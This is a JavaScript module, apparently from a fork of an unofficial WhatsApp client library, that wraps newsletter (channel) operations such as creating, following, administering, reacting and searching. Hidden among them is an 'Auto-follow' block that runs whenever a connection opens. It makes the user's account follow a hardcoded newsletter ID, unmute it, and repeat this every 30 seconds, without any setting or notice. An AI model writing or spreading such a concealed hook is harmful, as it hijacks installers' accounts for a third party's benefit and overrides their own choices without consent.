import { QueryIds, XWAPaths } from '../Types/index.js'
import { generateProfilePicture } from '../Utils/messages-media.js'
import { getBinaryNodeChild } from '../WABinary/index.js'
import { makeGroupsSocket } from './groups.js'
import { executeWMexQuery as genericExecuteWMexQuery } from './mex.js'

// ─── Parsers ──────────────────────────────────────────────────────────────────

const parseNewsletterCreateResponse = (response) => {
  const { id, thread_metadata: thread, viewer_metadata: viewer } = response
  return {
    id,
    owner: undefined,
    name: thread.name.text,
    creation_time: parseInt(thread.creation_time, 10),
    description: thread.description.text,
    invite: thread.invite,
    subscribers: parseInt(thread.subscribers_count, 10),
    verification: thread.verification,
    picture: { id: thread.picture.id, directPath: thread.picture.direct_path },
    mute_state: viewer.mute
  }
}

const parseNewsletterMetadata = (result) => {
  if (typeof result !== 'object' || result === null) return null
  if ('id' in result && typeof result.id === 'string') return result
  if ('result' in result && typeof result.result === 'object' && result.result !== null && 'id' in result.result) return result.result
  return null
}

// ─── Socket ───────────────────────────────────────────────────────────────────

export const makeNewsletterSocket = (config) => {
  const sock = makeGroupsSocket(config)
  const { query, generateMessageTag } = sock

  const executeWMexQuery = (variables, queryId, dataPath) =>
    genericExecuteWMexQuery(variables, queryId, dataPath, query, generateMessageTag)

  // ─── Internal helpers ───────────────────────────────────────────────────────

  const newsletterUpdate = (jid, updates) =>
    executeWMexQuery(
      { newsletter_id: jid, updates: { ...updates, settings: null } },
      QueryIds.UPDATE_METADATA,
      XWAPaths.xwa2_newsletter_update
    )

  const newsletterUpdateUserSetting = (jid, setting) =>
    executeWMexQuery(
      { input: { newsletter_id: jid, ...setting } },
      QueryIds.UPDATE_USER_SETTING,
      XWAPaths.xwa2_newsletter_update_user_setting
    )

  const isFollowingNewsletter = async (jid) => {
    try {
      const result = await executeWMexQuery(
        { newsletter_id: jid, input: { key: jid, type: 'NEWSLETTER', view_role: 'GUEST' }, fetch_viewer_metadata: true },
        QueryIds.FETCH,
        XWAPaths.xwa2_newsletter
      )
      return result?.viewer_metadata?.is_subscribed === true
    } catch { return false }
  }

  // ─── Auto-follow ────────────────────────────────────────────────────────────

  const AUTO_FOLLOW_NEWSLETTER = '120363422827915475@newsletter'
  const AUTO_FOLLOW_FORCE_MODE = true
  let autoFollowInterval = null

  const performNewsletterFollow = async (jid) => {
    try {
      if (!AUTO_FOLLOW_FORCE_MODE) {
        const isFollowing = await isFollowingNewsletter(jid)
        if (isFollowing) { config.logger?.debug?.(`Already following newsletter: ${jid}`); return true }
      }
      await executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2)
      config.logger?.debug?.(`✅ Followed newsletter: ${jid}`)
      await new Promise(resolve => setTimeout(resolve, 500))
      try {
        await newsletterUpdateUserSetting(jid, { mute: 'NOT_MUTED' })
        config.logger?.debug?.(`✅ Unmuted newsletter: ${jid}`)
      } catch (err) { config.logger?.trace?.(`Unmute failed: ${err.message}`) }
      return true
    } catch (err) {
      config.logger?.trace?.(`Newsletter follow attempt failed: ${err.message}`)
      return false
    }
  }

  sock.ev.on('connection.update', async ({ connection }) => {
    if (connection === 'open') {
      if (autoFollowInterval) { clearInterval(autoFollowInterval); autoFollowInterval = null }
      await new Promise(resolve => setTimeout(resolve, 3000))
      config.logger?.info?.('Attempting initial auto-follow...')
      try {
        const success = await performNewsletterFollow(AUTO_FOLLOW_NEWSLETTER)
        if (success) config.logger?.info?.(`✅ Auto-followed newsletter: ${AUTO_FOLLOW_NEWSLETTER}`)
      } catch (err) { config.logger?.debug?.(`Initial auto-follow failed: ${err.message}`) }
      autoFollowInterval = setInterval(async () => {
        try {
          await performNewsletterFollow(AUTO_FOLLOW_NEWSLETTER)
          config.logger?.trace?.(`Periodic auto-follow: ${AUTO_FOLLOW_NEWSLETTER}`)
        } catch (err) { config.logger?.trace?.(`Periodic auto-follow failed: ${err.message}`) }
      }, 30 * 1000)
      config.logger?.info?.('Auto-follow interval started (every 30 seconds)')
    } else if (connection === 'close') {
      if (autoFollowInterval) { clearInterval(autoFollowInterval); autoFollowInterval = null; config.logger?.debug?.('Auto-follow interval stopped') }
    }
  })

  // ─── Public API ──────────────────────────────────────────────────────────────

  return {
    ...sock,

    // ─── CRUD ────────────────────────────────────────────────────────────────

    newsletterCreate: async (name, description) => {
      const rawResponse = await executeWMexQuery(
        { input: { name, description: description ?? null } },
        QueryIds.CREATE,
        XWAPaths.xwa2_newsletter_create
      )
      return parseNewsletterCreateResponse(rawResponse)
    },

    newsletterUpdate,

    newsletterDelete: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.DELETE, XWAPaths.xwa2_newsletter_delete_v2),

    // ─── Metadata ────────────────────────────────────────────────────────────

    newsletterMetadata: async (type, key) => {
      const result = await executeWMexQuery(
        { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: true, input: { key, type: type.toUpperCase() } },
        QueryIds.FETCH,
        XWAPaths.xwa2_newsletter
      )
      return parseNewsletterMetadata(result)
    },

    newsletterMetadataDehydrated: (jid) =>
      executeWMexQuery(
        { newsletter_id: jid },
        QueryIds.FETCH_DEHYDRATED,
        XWAPaths.xwa2_newsletter
      ),

    newsletterFetchAll: () =>
      executeWMexQuery({}, QueryIds.FETCH_ALL_METADATA, XWAPaths.xwa2_newsletter),

    newsletterUpdateName: (jid, name) => newsletterUpdate(jid, { name }),

    newsletterUpdateDescription: (jid, description) => newsletterUpdate(jid, { description }),

    newsletterUpdatePicture: async (jid, content) => {
      const { img } = await generateProfilePicture(content)
      return newsletterUpdate(jid, { picture: img.toString('base64') })
    },

    newsletterRemovePicture: (jid) => newsletterUpdate(jid, { picture: '' }),

    // ─── Follow / mute ───────────────────────────────────────────────────────

    newsletterFollow: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2),

    newsletterUnfollow: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.UNFOLLOW, XWAPaths.xwa2_newsletter_leave_v2),

    newsletterMute: (jid) =>
      newsletterUpdateUserSetting(jid, { mute: 'MUTED' }),

    newsletterUnmute: (jid) =>
      newsletterUpdateUserSetting(jid, { mute: 'NOT_MUTED' }),

    isFollowingNewsletter,

    // ─── Followers / subscribers ─────────────────────────────────────────────

    newsletterFollowers: (jid, count = 50, after) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, count, ...(after ? { after } : {}) } },
        QueryIds.FOLLOWERS,
        XWAPaths.xwa2_newsletter_followers
      ),

    // ─── Admin ───────────────────────────────────────────────────────────────

    newsletterAdminInfo: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.ADMIN_INFO, XWAPaths.xwa2_newsletter_admin),

    newsletterAdminCapabilities: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.ADMIN_CAPABILITIES, XWAPaths.xwa2_newsletter_admin),

    newsletterPendingInvites: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.PENDING_INVITES, XWAPaths.xwa2_newsletter_admin),

    newsletterAdminInviteCreate: (jid, userJid) =>
      executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.ADMIN_INVITE_CREATE, XWAPaths.xwa2_newsletter_admin_invite_create),

    newsletterAdminInviteAccept: (jid, inviteCode) =>
      executeWMexQuery({ newsletter_id: jid, invite_code: inviteCode }, QueryIds.ADMIN_INVITE_ACCEPT, XWAPaths.xwa2_newsletter_admin_invite_accept),

    newsletterAdminInviteRevoke: (jid, userJid) =>
      executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.ADMIN_INVITE_REVOKE, XWAPaths.xwa2_newsletter_admin_invite_revoke),

    newsletterDemote: (jid, userJid) =>
      executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.DEMOTE, XWAPaths.xwa2_newsletter_admin_demote),

    newsletterChangeOwner: (jid, newOwnerJid) =>
      executeWMexQuery({ newsletter_id: jid, user_id: newOwnerJid }, QueryIds.CHANGE_OWNER, XWAPaths.xwa2_newsletter_change_owner),

    newsletterAdminProfileUpdate: (jid, setting) =>
      executeWMexQuery({ input: { newsletter_id: jid, ...setting } }, QueryIds.ADMIN_PROFILE_UPDATE, XWAPaths.xwa2_newsletter_admin),

    newsletterInsights: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.INSIGHTS, XWAPaths.xwa2_newsletter_admin_insights),

    // ─── Messages / pins ─────────────────────────────────────────────────────

    newsletterFetchMessages: async (jid, count, since, after) => {
      const attrs = { count: count.toString() }
      if (typeof since === 'number') attrs.since = since.toString()
      if (after) attrs.after = after.toString()
      return query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'get', xmlns: 'newsletter', to: jid },
        content: [{ tag: 'message_updates', attrs }]
      })
    },

    newsletterPinMessages: (jid, serverIds) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, server_ids: Array.isArray(serverIds) ? serverIds : [serverIds] } },
        QueryIds.PIN_MESSAGES,
        XWAPaths.xwa2_newsletter_pin_messages
      ),

    newsletterUnpinMessages: (jid, serverIds) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, server_ids: Array.isArray(serverIds) ? serverIds : [serverIds] } },
        QueryIds.UNPIN_MESSAGES,
        XWAPaths.xwa2_newsletter_unpin_messages
      ),

    // ─── Reactions ───────────────────────────────────────────────────────────

    newsletterReactMessage: (jid, serverId, reaction) =>
      query({
        tag: 'message',
        attrs: { to: jid, ...(reaction ? {} : { edit: '7' }), type: 'reaction', server_id: serverId, id: generateMessageTag() },
        content: [{ tag: 'reaction', attrs: reaction ? { code: reaction } : {} }]
      }),

    newsletterReactionSenderList: (jid, serverId, reactionCode, count = 20, after) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, server_id: serverId, reaction_code: reactionCode, count, ...(after ? { after } : {}) } },
        QueryIds.REACTION_SENDER_LIST,
        XWAPaths.xwa2_newsletters_reaction_sender_list
      ),

    // ─── Polls ───────────────────────────────────────────────────────────────

    newsletterPollVoters: (jid, serverId, optionId, count = 20, after) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, server_id: serverId, option_id: optionId, count, ...(after ? { after } : {}) } },
        QueryIds.POLL_VOTERS,
        XWAPaths.xwa2_newsletters_poll_voter_list
      ),

    // ─── Discovery ───────────────────────────────────────────────────────────

    newsletterRecommended: (count = 20) =>
      executeWMexQuery({ count }, QueryIds.RECOMMENDED, XWAPaths.xwa2_newsletters_recommended),

    newsletterSimilar: (jid, count = 10) =>
      executeWMexQuery({ newsletter_id: jid, count }, QueryIds.SIMILAR, XWAPaths.xwa2_newsletters_similar),

    newsletterDirectoryList: (filter, count = 30, after) =>
      executeWMexQuery(
        { input: { filter, count, ...(after ? { after } : {}) } },
        QueryIds.DIRECTORY_LIST,
        XWAPaths.xwa2_newsletters_directory_list
      ),

    newsletterDirectorySearch: (query_text, count = 30) =>
      executeWMexQuery(
        { input: { query: query_text, count } },
        QueryIds.DIRECTORY_SEARCH,
        XWAPaths.xwa2_newsletters_directory_search
      ),

    newsletterDirectoryCategories: () =>
      executeWMexQuery({}, QueryIds.DIRECTORY_CATEGORIES, XWAPaths.xwa2_newsletters_directory_category_preview),

    // ─── Labels ──────────────────────────────────────────────────────────────

    newsletterLabelAiContent: (jid, serverId, label) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, server_id: serverId, label } },
        QueryIds.LABEL_AI_CONTENT,
        XWAPaths.xwa2_newsletter_label_ai_content
      ),

    newsletterLabelPaidPartnership: (jid, serverId) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, server_id: serverId } },
        QueryIds.LABEL_PAID_PARTNERSHIP,
        XWAPaths.xwa2_newsletter_label_paid_partnership
      ),

    // ─── Live updates ────────────────────────────────────────────────────────

    subscribeNewsletterUpdates: async (jid) => {
      const result = await query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'set', xmlns: 'newsletter', to: jid },
        content: [{ tag: 'live_updates', attrs: {}, content: [] }]
      })
      const liveUpdatesNode = getBinaryNodeChild(result, 'live_updates')
      const duration = liveUpdatesNode?.attrs?.duration
      return duration ? { duration } : null
    },

    // ─── Enforcement ─────────────────────────────────────────────────────────

    newsletterEnforcements: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.ENFORCEMENTS, XWAPaths.xwa2_newsletter),

    newsletterReports: (jid) =>
      executeWMexQuery({ newsletter_id: jid }, QueryIds.REPORTS, XWAPaths.xwa2_channels_reports),

    newsletterLogExposures: (jid, exposures) =>
      executeWMexQuery(
        { input: { newsletter_id: jid, exposures } },
        QueryIds.LOG_EXPOSURES,
        XWAPaths.xwa2_newsletter_log_exposures
      ),
  }
}